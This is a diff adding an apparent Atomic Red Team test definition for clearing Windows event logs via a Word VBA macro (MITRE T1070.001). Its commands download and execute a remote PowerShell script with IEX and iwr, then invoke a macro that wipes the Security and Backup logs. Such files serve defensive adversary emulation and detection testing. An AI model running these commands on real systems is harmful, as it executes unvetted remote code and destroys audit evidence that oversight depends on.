@@ -1,0 +1,13 @@
+#TechniqueName: Indicator Removal on Host: Clear Windows Event Logs
+#AtomicTestName: Clear Event Logs via VBA
+#Description: This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. &&Elevation is required for this module to execute properly, otherwise WINWORD will throw an "Access Denied" error&
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+
+
+#commands
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
+
